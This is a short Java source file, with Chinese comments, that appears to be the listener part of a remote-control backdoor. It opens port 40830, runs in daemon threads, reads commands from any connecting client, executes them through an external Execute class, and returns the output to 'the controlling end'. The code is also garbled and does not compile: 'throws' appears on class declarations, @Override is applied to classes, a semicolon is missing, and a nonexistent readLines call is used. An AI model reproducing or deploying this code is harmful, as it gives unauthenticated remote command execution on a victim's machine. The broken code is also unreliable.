package link.inte.controller;
import java.net.*;
import java.io.*;
import link.inte.controller.*;

@Override
class WaitThread extends Thread throws Exception
{
	public void run(){
	ServerSocket waitServerSocket = new ServerSocket(40830);
	while (true)
	{
		Socket s = waitServerSocket.accept();
		DoThread d = new DoThread(s);
		//设置为后台线程
		d.setDaemon(true);
		d.start();
		//发挥存在感
		System.out.println("启动一次连接")
	}
	}
}

@Override
class DoThread extends Thread throws Exception
{
	private Socket socket;
	//新构造器，获得Socket会话
	public DoThread(Socket s){
		this.socket = s;
	}
	
	public void run(){
		this.socket.setSoTimeout(10 * 1000);
		BufferedReader br = new BufferedReader(new InputStreamReader(this.socket.getInputStream()));
		//读取命令
		String CMD = br.readLines();
		//关闭输入流
		this.socket.shutdownInput();
		//执行
		String result = new Execute().run(CMD);
		PrintStream ps = new PrintStream(this.socket.getOutputStream());
		//向控制端返回数据
		ps.println(result);
		//全部关闭
		ps.close();
		this.socket.close();
	}

}

